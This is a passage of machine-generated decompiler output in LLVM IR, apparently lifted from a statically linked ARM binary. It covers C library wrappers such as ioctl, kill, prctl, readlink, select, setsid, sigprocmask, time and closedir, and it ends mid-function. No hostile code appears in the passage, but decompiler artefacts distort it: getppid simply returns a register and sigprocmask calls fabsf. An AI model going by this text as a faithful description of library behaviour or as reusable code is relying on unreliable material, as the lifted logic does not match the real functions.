  %v0_12268.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_12268

dec_label_pc_12268:                               ; preds = %dec_label_pc_12214, %dec_label_pc_1225c
  %v0_12268 = phi i32 [ %v0_12214, %dec_label_pc_12214 ], [ %v0_12268.pre, %dec_label_pc_1225c ]
  store i32 %v0_12268, i32* %r0.global-to-local, align 4
  %v2_12270 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_12270, i32* @r4, align 4
  store i32 %v6_1219c, i32* @r5, align 4
  store i32 %v12_1219c, i32* @r7, align 4
  ret i32 %v0_12268

; uselistorder directives
  uselistorder i32 %v0_12268, { 1, 0 }
  uselistorder i32 %v0_1225c, { 1, 0 }
  uselistorder i32 %v0_1222c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_121c0, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 2, 7, 6, 0, 1 }
  uselistorder label %dec_label_pc_12268, { 1, 0 }
  uselistorder label %dec_label_pc_1225c, { 1, 0 }
  uselistorder label %dec_label_pc_1221c, { 1, 0 }
  uselistorder label %dec_label_pc_12214, { 1, 0 }
}

define i32 @getppid() local_unnamed_addr {
entry:
  %v1_1229c = load i32, i32* @r0, align 4
  ret i32 %v1_1229c
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v9_122a0 = load i32, i32* @r3, align 4
  store i32 %v9_122a0, i32* %stack_var_-4, align 4
  %v3_122a4 = load i32, i32* @r4, align 4
  store i32 %v3_122a4, i32* %stack_var_-32, align 4
  %v6_122a4 = load i32, i32* @r5, align 4
  %v12_122a4 = load i32, i32* @r7, align 4
  %v4_122b4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 13032) to i32*), align 4
  %v2_122bc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_122bc, i32* @r3, align 4
  %v2_122c0 = icmp eq i32 %v4_122b4, 0
  %v0_122c8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_122c8, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  br i1 %v2_122c0, label %dec_label_pc_122d8, label %dec_label_pc_12310

dec_label_pc_122d8:                               ; preds = %entry
  %tmp = icmp ult i32 %v0_122c8, -4095
  br i1 %tmp, label %dec_label_pc_12308, label %dec_label_pc_122f0

dec_label_pc_122f0:                               ; preds = %dec_label_pc_122d8
  %v1_122f4 = sub i32 0, %v0_122c8
  %v3_122f8 = load i16, i16* @global_var_233d0.483, align 2
  %v4_122f8 = sext i16 %v3_122f8 to i32
  store i32 %v4_122f8, i32* @r3, align 4
  %v0_122fc = call i32 @__aeabi_read_tp()
  %v2_12300 = load i32, i32* @r3, align 4
  %v3_12300 = add i32 %v2_12300, %v0_122fc
  %v4_12300 = inttoptr i32 %v3_12300 to i32*
  store i32 %v1_122f4, i32* %v4_12300, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12308

dec_label_pc_12308:                               ; preds = %dec_label_pc_122d8, %dec_label_pc_122f0
  %v0_12308 = phi i32 [ %v0_122c8, %dec_label_pc_122d8 ], [ -1, %dec_label_pc_122f0 ]
  br label %dec_label_pc_1235c

dec_label_pc_12310:                               ; preds = %entry
  %v0_12310 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_12310, i32* %r6.global-to-local, align 4
  %v0_12320 = load i32, i32* @r4, align 4
  store i32 %v0_12320, i32* %r0.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_12320, -4095
  br i1 %tmp15, label %dec_label_pc_12350, label %dec_label_pc_12338

dec_label_pc_12338:                               ; preds = %dec_label_pc_12310
  %v1_1233c = sub i32 0, %v0_12320
  %v3_12340 = load i16, i16* @global_var_233d0.483, align 2
  %v4_12340 = sext i16 %v3_12340 to i32
  store i32 %v4_12340, i32* @r3, align 4
  %v0_12344 = call i32 @__aeabi_read_tp()
  store i32 %v0_12344, i32* %r0.global-to-local, align 4
  %v2_12348 = load i32, i32* @r3, align 4
  %v3_12348 = add i32 %v2_12348, %v0_12344
  %v4_12348 = inttoptr i32 %v3_12348 to i32*
  store i32 %v1_1233c, i32* %v4_12348, align 4
  %v0_12350.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12350

dec_label_pc_12350:                               ; preds = %dec_label_pc_12310, %dec_label_pc_12338
  %v0_12354 = phi i32 [ %v0_12320, %dec_label_pc_12310 ], [ -1, %dec_label_pc_12338 ]
  %v0_12350 = phi i32 [ %v0_12310, %dec_label_pc_12310 ], [ %v0_12350.pre, %dec_label_pc_12338 ]
  store i32 %v0_12350, i32* %r0.global-to-local, align 4
  store i32 %v0_12354, i32* @r7, align 4
  %v1_12358 = call i32 @__libc_disable_asynccancel(i32 %v0_12350)
  store i32 %v1_12358, i32* %r0.global-to-local, align 4
  %v0_1235c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1235c

dec_label_pc_1235c:                               ; preds = %dec_label_pc_12308, %dec_label_pc_12350
  %v0_1235c = phi i32 [ %v0_12308, %dec_label_pc_12308 ], [ %v0_1235c.pre, %dec_label_pc_12350 ]
  store i32 %v0_1235c, i32* %r0.global-to-local, align 4
  %v2_12364 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_12364, i32* @r4, align 4
  store i32 %v6_122a4, i32* @r5, align 4
  store i32 %v12_122a4, i32* @r7, align 4
  ret i32 %v0_1235c

; uselistorder directives
  uselistorder i32 %v0_1235c, { 1, 0 }
  uselistorder i32 %v0_12350, { 1, 0 }
  uselistorder i32 %v0_12320, { 1, 2, 0, 3 }
  uselistorder i32 %v0_122c8, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 7, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_1235c, { 1, 0 }
  uselistorder label %dec_label_pc_12350, { 1, 0 }
  uselistorder label %dec_label_pc_12308, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12380 = load i32, i32* @r7, align 4
  store i32 %v3_12380, i32* %stack_var_-8, align 4
  %v0_1238c = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1238c, -4095
  br i1 %tmp, label %dec_label_pc_123ac, label %dec_label_pc_12394

dec_label_pc_12394:                               ; preds = %entry
  %v1_12398 = sub i32 0, %v0_1238c
  %v3_1239c = load i16, i16* @global_var_233d0.483, align 2
  %v4_1239c = sext i16 %v3_1239c to i32
  %v0_123a0 = call i32 @__aeabi_read_tp()
  %v3_123a4 = add i32 %v4_1239c, %v0_123a0
  %v4_123a4 = inttoptr i32 %v3_123a4 to i32*
  store i32 %v1_12398, i32* %v4_123a4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_123ac.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_123ac

dec_label_pc_123ac:                               ; preds = %entry, %dec_label_pc_12394
  %v1_123b0 = phi i32 [ %v0_1238c, %entry ], [ -1, %dec_label_pc_12394 ]
  %v2_123ac = phi i32 [ %v3_12380, %entry ], [ %v2_123ac.pre, %dec_label_pc_12394 ]
  store i32 %v2_123ac, i32* @r7, align 4
  ret i32 %v1_123b0

; uselistorder directives
  uselistorder i32 %v0_1238c, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_123ac, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_123b8 = load i32, i32* @r4, align 4
  store i32 %v3_123b8, i32* %stack_var_-12, align 4
  %v0_123c8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_123c8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_123c8, -4095
  br i1 %tmp, label %dec_label_pc_123f0, label %dec_label_pc_123d8

dec_label_pc_123d8:                               ; preds = %entry
  %v0_123dc = call i32 @__aeabi_read_tp()
  %v3_123e0 = load i16, i16* @global_var_233d0.483, align 2
  %v4_123e0 = sext i16 %v3_123e0 to i32
  %v0_123e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_123e4 = sub i32 0, %v0_123e4
  store i32 %v1_123e4, i32* %r2.global-to-local, align 4
  %v3_123e8 = add i32 %v4_123e0, %v0_123dc
  %v4_123e8 = inttoptr i32 %v3_123e8 to i32*
  store i32 %v1_123e4, i32* %v4_123e8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_123f0.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_123f0

dec_label_pc_123f0:                               ; preds = %entry, %dec_label_pc_123d8
  %v1_123f4 = phi i32 [ %v0_123c8, %entry ], [ -1, %dec_label_pc_123d8 ]
  %v2_123f0 = phi i32 [ %v3_123b8, %entry ], [ %v2_123f0.pre, %dec_label_pc_123d8 ]
  store i32 %v2_123f0, i32* @r4, align 4
  ret i32 %v1_123f4

; uselistorder directives
  uselistorder i32 %v0_123c8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_123f0, { 1, 0 }
}

define i32 @readlink(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_123fc = load i32, i32* @r7, align 4
  store i32 %v3_123fc, i32* %stack_var_-8, align 4
  %v0_12408 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12408, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12408, -4095
  br i1 %tmp, label %dec_label_pc_12430, label %dec_label_pc_12418

dec_label_pc_12418:                               ; preds = %entry
  %v0_1241c = call i32 @__aeabi_read_tp()
  %v3_12420 = load i16, i16* @global_var_233d0.483, align 2
  %v4_12420 = sext i16 %v3_12420 to i32
  %v0_12424 = load i32, i32* %r2.global-to-local, align 4
  %v1_12424 = sub i32 0, %v0_12424
  store i32 %v1_12424, i32* %r2.global-to-local, align 4
  %v3_12428 = add i32 %v4_12420, %v0_1241c
  %v4_12428 = inttoptr i32 %v3_12428 to i32*
  store i32 %v1_12424, i32* %v4_12428, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12430.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12430

dec_label_pc_12430:                               ; preds = %entry, %dec_label_pc_12418
  %v1_12434 = phi i32 [ %v0_12408, %entry ], [ -1, %dec_label_pc_12418 ]
  %v2_12430 = phi i32 [ %v3_123fc, %entry ], [ %v2_12430.pre, %dec_label_pc_12418 ]
  store i32 %v2_12430, i32* @r7, align 4
  ret i32 %v1_12434

; uselistorder directives
  uselistorder i32 %v0_12408, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12430, { 1, 0 }
}

define i32 @__syscall_select() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1243c = load i32, i32* @r4, align 4
  store i32 %v3_1243c, i32* %stack_var_-12, align 4
  %v0_1244c = load i32, i32* @r0, align 4
  store i32 %v0_1244c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1244c, -4095
  br i1 %tmp, label %dec_label_pc_12474, label %dec_label_pc_1245c

dec_label_pc_1245c:                               ; preds = %entry
  %v0_12460 = call i32 @__aeabi_read_tp()
  %v3_12464 = load i16, i16* @global_var_233d0.483, align 2
  %v4_12464 = sext i16 %v3_12464 to i32
  %v0_12468 = load i32, i32* %r2.global-to-local, align 4
  %v1_12468 = sub i32 0, %v0_12468
  store i32 %v1_12468, i32* %r2.global-to-local, align 4
  %v3_1246c = add i32 %v4_12464, %v0_12460
  %v4_1246c = inttoptr i32 %v3_1246c to i32*
  store i32 %v1_12468, i32* %v4_1246c, align 4
  %v2_12474.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_12474

dec_label_pc_12474:                               ; preds = %entry, %dec_label_pc_1245c
  %v1_12478 = phi i32 [ %v0_1244c, %entry ], [ -1, %dec_label_pc_1245c ]
  %v2_12474 = phi i32 [ %v3_1243c, %entry ], [ %v2_12474.pre, %dec_label_pc_1245c ]
  store i32 %v2_12474, i32* @r4, align 4
  ret i32 %v1_12478

; uselistorder directives
  uselistorder i32 %v0_1244c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12474, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_12480 = load i32, i32* @r4, align 4
  store i32 %v3_12480, i32* %stack_var_-28, align 4
  %v6_12480 = load i32, i32* @r5, align 4
  %v9_12480 = load i32, i32* @r6, align 4
  %v12_12480 = load i32, i32* @r7, align 4
  %v15_12480 = load i32, i32* @r8, align 4
  %v18_12480 = load i32, i32* @sl, align 4
  %v21_12480 = load i32, i32* @lr, align 4
  %v4_12490 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 13032) to i32*), align 4
  %v2_12498 = icmp eq i32 %v4_12490, 0
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_12498, label %dec_label_pc_124b4, label %entry.dec_label_pc_124c0_crit_edge

entry.dec_label_pc_124c0_crit_edge:               ; preds = %entry
  br label %dec_label_pc_124c0

dec_label_pc_124b4:                               ; preds = %entry
  store i32 %v3_12480, i32* @r4, align 4
  store i32 %v9_12480, i32* @r6, align 4
  store i32 %v12_12480, i32* @r7, align 4
  store i32 %v15_12480, i32* @r8, align 4
  store i32 %v18_12480, i32* %sl.global-to-local, align 4
  %v0_124bc = call i32 @__syscall_select()
  br label %dec_label_pc_124c0

dec_label_pc_124c0:                               ; preds = %entry.dec_label_pc_124c0_crit_edge, %dec_label_pc_124b4
  %v0_124c0 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_124c0, i32* @r5, align 4
  %v0_124d4 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_124d4, i32* @r0, align 4
  %v0_124dc = call i32 @__syscall_select()
  store i32 %v0_124dc, i32* @r4, align 4
  %v0_124e4 = load i32, i32* @r5, align 4
  %v1_124e8 = call i32 @__libc_disable_asynccancel(i32 %v0_124e4)
  %v0_124ec = load i32, i32* @r4, align 4
  %v2_124f4 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_124f4, i32* @r4, align 4
  store i32 %v6_12480, i32* @r5, align 4
  store i32 %v9_12480, i32* @r6, align 4
  store i32 %v12_12480, i32* @r7, align 4
  store i32 %v15_12480, i32* @r8, align 4
  store i32 %v18_12480, i32* @sl, align 4
  store i32 %v21_12480, i32* @lr, align 4
  ret i32 %v0_124ec

; uselistorder directives
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_124c0, { 1, 0 }
}

define i32 @__GI_setsid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12504 = load i32, i32* @r7, align 4
  store i32 %v3_12504, i32* %stack_var_-8, align 4
  %v0_12510 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12510, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12510, -4095
  br i1 %tmp, label %dec_label_pc_12538, label %dec_label_pc_12520

dec_label_pc_12520:                               ; preds = %entry
  %v0_12524 = call i32 @__aeabi_read_tp()
  %v3_12528 = load i16, i16* @global_var_233d0.483, align 2
  %v4_12528 = sext i16 %v3_12528 to i32
  %v0_1252c = load i32, i32* %r2.global-to-local, align 4
  %v1_1252c = sub i32 0, %v0_1252c
  store i32 %v1_1252c, i32* %r2.global-to-local, align 4
  %v3_12530 = add i32 %v4_12528, %v0_12524
  %v4_12530 = inttoptr i32 %v3_12530 to i32*
  store i32 %v1_1252c, i32* %v4_12530, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12538.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12538

dec_label_pc_12538:                               ; preds = %entry, %dec_label_pc_12520
  %v1_1253c = phi i32 [ %v0_12510, %entry ], [ -1, %dec_label_pc_12520 ]
  %v2_12538 = phi i32 [ %v3_12504, %entry ], [ %v2_12538.pre, %dec_label_pc_12520 ]
  store i32 %v2_12538, i32* @r7, align 4
  ret i32 %v1_1253c

; uselistorder directives
  uselistorder i32 %v0_12510, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12538, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_12548 = icmp eq i32* %arg2, null
  br i1 %v2_12548, label %dec_label_pc_1258c, label %dec_label_pc_1255c

dec_label_pc_1255c:                               ; preds = %entry
  %v2_1255c = load i32, i32* %arg2, align 4
  %v1_12560 = icmp slt i32 %v2_1255c, 0
  br i1 %v1_12560, label %dec_label_pc_12574, label %dec_label_pc_12568

dec_label_pc_12568:                               ; preds = %dec_label_pc_1255c
  %tmp = ptrtoint i32* %arg2 to i32
  %.pre = add i32 %tmp, 4
  %.pre3 = inttoptr i32 %.pre to i32*
  %v3_12568 = load i32, i32* %.pre3, align 4
  %v1_1256c = urem i32 %v3_12568, 2
  %v2_1256c = icmp eq i32 %v1_1256c, 0
  br i1 %v2_1256c, label %dec_label_pc_1258c, label %dec_label_pc_12574

dec_label_pc_12574:                               ; preds = %dec_label_pc_1255c, %dec_label_pc_12568
  %v2_12574 = load i32, i32* %arg2, align 4
  %tmp9 = bitcast i32 %v2_12574 to float
  %tmp10 = call float @fabsf(float %tmp9)
  br label %dec_label_pc_1258c

dec_label_pc_1258c:                               ; preds = %dec_label_pc_12568, %entry, %dec_label_pc_12574
  %tmp11 = icmp ult i32 %arg1, -4095
  br i1 %tmp11, label %dec_label_pc_125c0, label %dec_label_pc_125a8

dec_label_pc_125a8:                               ; preds = %dec_label_pc_1258c
  %v1_125ac = sub i32 0, %arg1
  %v3_125b0 = load i16, i16* @global_var_233d0.483, align 2
  %v4_125b0 = sext i16 %v3_125b0 to i32
  %v0_125b4 = call i32 @__aeabi_read_tp()
  %v3_125b8 = add i32 %v4_125b0, %v0_125b4
  %v4_125b8 = inttoptr i32 %v3_125b8 to i32*
  store i32 %v1_125ac, i32* %v4_125b8, align 4
  br label %dec_label_pc_125c0

dec_label_pc_125c0:                               ; preds = %dec_label_pc_1258c, %dec_label_pc_125a8
  %v1_125c8 = phi i32 [ %arg1, %dec_label_pc_1258c ], [ -1, %dec_label_pc_125a8 ]
  ret i32 %v1_125c8

; uselistorder directives
  uselistorder i32* %arg2, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_125c0, { 1, 0 }
  uselistorder label %dec_label_pc_1258c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12574, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_125d4 = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* @r1, align 4
  %v2_125e4 = call i32 @gettimeofday(i32 %v2_125d4, i32 0)
  %v2_125e8 = load i32, i32* %stack_var_-16, align 4
  %v2_125ec = icmp eq i32* %arg1, null
  br i1 %v2_125ec, label %bb6, label %bb

bb:                                               ; preds = %entry
  store i32 %v2_125e8, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  ret i32 %v2_125e8

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_12600 = load i32, i32* @r4, align 4
  store i32 %v3_12600, i32* %stack_var_-24, align 4
  %v9_12600 = load i32, i32* @r6, align 4
  %v12_12600 = load i32, i32* @r7, align 4
  %v15_12600 = load i32, i32* @r8, align 4
  %v18_12600 = load i32, i32* @lr, align 4
  %v2_12604 = load i32, i32* %arg1, align 4
  store i32 %v2_12604, i32* %r3.global-to-local, align 4
  %v3_1260c = icmp eq i32 %v2_12604, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* @r6, align 4
  br i1 %v3_1260c, label %dec_label_pc_12620, label %dec_label_pc_1263c

dec_label_pc_12620:                               ; preds = %entry
  store i32 69024, i32* %r2.global-to-local, align 4
  %v0_12624 = call i32 @__aeabi_read_tp()
  %v3_12628 = load i16, i16* @global_var_233d0.483, align 2
  %v4_12628 = sext i16 %v3_12628 to i32
  store i32 %v4_12628, i32* %r2.global-to-local, align 4
  %v0_1262c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_1262c, i32* %r1.global-to-local, align 4
  %v1_12630 = add i32 %v0_1262c, 10
  store i32 %v1_12630, i32* %r3.global-to-local, align 4
  %v3_12634 = add i32 %v4_12628, %v0_12624
  %v4_12634 = inttoptr i32 %v3_12634 to i32*
  store i32 %v1_12630, i32* %v4_12634, align 4
  %v0_126e4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_126e4

dec_label_pc_1263c:                               ; preds = %entry
  store i32 68, i32* %r3.global-to-local, align 4
  %v1_12640 = add i32 %tmp, 24
  store i32 %v1_12640, i32* %r2.global-to-local, align 4
  %v4_12648 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 68) to i32*), align 4
  store i32 %v4_12648, i32* %r1.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_12654 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_12654)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_1266c = load i32, i32* @r6, align 4
  %v2_1266c = add i32 %v0_1266c, 16
  %v3_1266c = inttoptr i32 %v2_1266c to i32*
  %v4_1266c = load i32, i32* %v3_1266c, align 4
  call void @__pseudo_branch(i32 %v4_1266c)
  %v0_12678 = load i32, i32* @r7, align 4
  %v1_12678 = inttoptr i32 %v0_12678 to i32*
  %v2_12678 = load i32, i32* %v1_12678, align 4
  store i32 %v2_12678, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_12688 = load i32, i32* @r8, align 4
  store i32 %v0_12688, i32* %v1_12678, align 4
  %v0_1268c = load i32, i32* @r6, align 4
  %v1_1268c = load i32, i32* %r3.global-to-local, align 4
  %v2_1268c = add i32 %v1_1268c, %v0_1268c
  %v3_1268c = inttoptr i32 %v2_1268c to i32*
  %v4_1268c = load i32, i32* %v3_1268c, align 4
  store i32 ptrtoint (i32* @global_var_12698.509 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1268c)
  %v0_12698 = load i32, i32* @r7, align 4
  %v1_12698 = add i32 %v0_12698, 12
  %v2_12698 = inttoptr i32 %v1_12698 to i32*
  %v3_12698 = load i32, i32* %v2_12698, align 4
  store i32 %v3_12698, i32* @r0, align 4
  %v0_1269c = call i32 @free()
  %v0_126a0 = load i32, i32* @r7, align 4
  store i32 %v0_126a0, i32* @r0, align 4
  %v0_126a4 = call i32 @free()
  %v0_126ac = load i32, i32* @r4, align 4
  store i32 %v0_126ac, i32* %r2.global-to-local, align 4
  %tmp11 = icmp ult i32 %v0_126ac, -4095
  br i1 %tmp11, label %dec_label_pc_126e0, label %dec_label_pc_126c8

dec_label_pc_126c8:                               ; preds = %dec_label_pc_1263c
  store i32 68856, i32* %r3.global-to-local, align 4
  %v0_126cc = call i32 @__aeabi_read_tp()
  %v3_126d0 = load i16, i16* @global_var_233d0.483, align 2
  %v4_126d0 = sext i16 %v3_126d0 to i32
  store i32 %v4_126d0, i32* %r3.global-to-local, align 4
  %v0_126d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_126d4 = sub i32 0, %v0_126d4
  store i32 %v1_126d4, i32* %r2.global-to-local, align 4
  %v3_126d8 = add i32 %v4_126d0, %v0_126cc
  %v4_126d8 = inttoptr i32 %v3_126d8 to i32*
  store i32 %v1_126d4, i32* %v4_126d8, align 4
  %v0_126dc = load i32, i32* @r8, align 4
  br label %dec_label_pc_126e0

dec_label_pc_126e0:                               ; preds = %dec_label_pc_1263c, %dec_label_pc_126c8
  %v0_126e0 = phi i32 [ %v0_126ac, %dec_label_pc_1263c ], [ %v0_126dc, %dec_label_pc_126c8 ]
  store i32 %v0_126e0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_126e4

dec_label_pc_126e4:                               ; preds = %dec_label_pc_12620, %dec_label_pc_126e0
  %v0_126e4 = phi i32 [ %v0_126e4.pre, %dec_label_pc_12620 ], [ %v0_126e0, %dec_label_pc_126e0 ]
  %v2_126ec = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_126ec, i32* @r4, align 4
  store i32 %v9_12600, i32* @r6, align 4
  store i32 %v12_12600, i32* @r7, align 4
  store i32 %v15_12600, i32* @r8, align 4
  store i32 %v18_12600, i32* @lr, align 4
  ret i32 %v0_126e4

; uselistorder directives
  uselistorder i32 %v0_126ac, { 1, 0, 2 }
  uselistorder label %dec_label_pc_126e4, { 1, 0 }
  uselistorder label %dec_label_pc_126e0, { 1, 0 }
}

define i32 @function_126fc(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_126fc:
  %v0_126fc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_126fc, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_126fc
  store i32 0, i32* %arg2, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_126fc, %bb
  %v8_1270c = phi i32 [ %arg1, %dec_label_pc_126fc ], [ 0, %bb ]
  ret i32 %v8_1270c

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @fd_to_DIR(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_12710 = load i32, i32* @r4, align 4
  %v6_12710 = load i32, i32* @r5, align 4
  %v9_12710 = load i32, i32* @r6, align 4
  %v12_12710 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 48, i32* @r0, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_12724 = call i32 @malloc()
  %v2_1272c = icmp eq i32 %v0_12724, 0
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* @r6, align 4
  br i1 %v2_1272c, label %bb, label %dec_label_pc_1273c

bb:                                               ; preds = %entry
  br label %dec_label_pc_127c8

dec_label_pc_1273c:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_12740 = load i32, i32* @r4, align 4
  %v2_12740 = icmp ugt i32 %v0_12740, 511
  %v2_12744 = add i32 %v0_12724, 4
  %v3_12744 = inttoptr i32 %v2_12744 to i32*
  store i32 0, i32* %v3_12744, align 4
  %v0_12748 = load i32, i32* %r3.global-to-local, align 4
  %v2_12748 = add i32 %v0_12724, 16
  %v3_12748 = inttoptr i32 %v2_12748 to i32*
  store i32 %v0_12748, i32* %v3_12748, align 4
  %v0_1274c = load i32, i32* %r3.global-to-local, align 4
  %v2_1274c = add i32 %v0_12724, 8
  %v3_1274c = inttoptr i32 %v2_1274c to i32*
  store i32 %v0_1274c, i32* %v3_1274c, align 4
  br i1 %v2_12740, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_1273c
  %v0_127542 = load i32, i32* @r4, align 4
  %v2_127543 = add i32 %v0_12724, 20
  %v3_127544 = inttoptr i32 %v2_127543 to i32*
  store i32 %v0_127542, i32* %v3_127544, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_1273c
  %v1_12750 = load i32, i32* %r3.global-to-local, align 4
  %v2_12750 = add i32 %v1_12750, 512
  store i32 %v2_12750, i32* %r3.global-to-local, align 4
  %v0_12754 = load i32, i32* @r4, align 4
  %v2_12754 = add i32 %v0_12724, 20
